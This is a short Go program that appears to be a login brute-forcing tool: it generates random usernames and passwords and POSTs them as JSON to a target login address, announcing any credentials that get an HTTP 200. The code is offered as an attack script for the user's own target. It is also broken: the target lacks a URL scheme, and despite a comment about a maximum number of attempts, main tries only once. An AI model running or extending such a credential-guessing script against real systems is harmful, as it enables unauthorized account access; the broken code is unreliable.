package main

import (
    "fmt"
    "math/rand"
    "net/http"
    _"strconv"
    "strings"
    "time"
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func init() {
    rand.Seed(time.Now().UnixNano())
}

func stringWithCharset(length int, charset string) string {
    b := make([]byte, length)
    for i := range b {
        b[i] = charset[rand.Intn(len(charset))]
    }
    return string(b)
}

func generateRandomString(length int) string {
    return stringWithCharset(length, charset)
}

func attemptLogin(username, password, targetURL string) bool {
    client := &http.Client{}
    req, err := http.NewRequest("POST", targetURL, strings.NewReader(fmt.Sprintf(`{"username":"%s", "password":"%s"}`, username, password)))
    if err != nil {
        fmt.Println("Error creating request:", err)
        return false
    }

    req.Header.Set("Content-Type", "application/json")

    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("Error sending request:", err)
        return false
    }
    defer resp.Body.Close()

    // This is a simplistic way to check for successful authentication.
    // Your actual success condition may vary.
    if resp.StatusCode == 200 {
        fmt.Println("Login successful with username:", username, "and password:", password)
        return true
    }

    return false
}

func main() {
    targetURL := "192.168.100.1" // Your target login URL
	                   // Max number of attempts to try
    usedCredentials := make(map[string]bool)

    username := generateRandomString(10)
    password := generateRandomString(10)

    // Ensure generated credentials haven't been used before
    if !usedCredentials[username+":"+password] {
        usedCredentials[username+":"+password] = true

        // Simulate a login attempt with the generated credentials
        fmt.Printf("Attempt %d: Trying username: %s and password: %s\n", 1, username, password)
        if attemptLogin(username, password, targetURL) {
            fmt.Println("Success! Credentials accepted.")
        }
    }
}


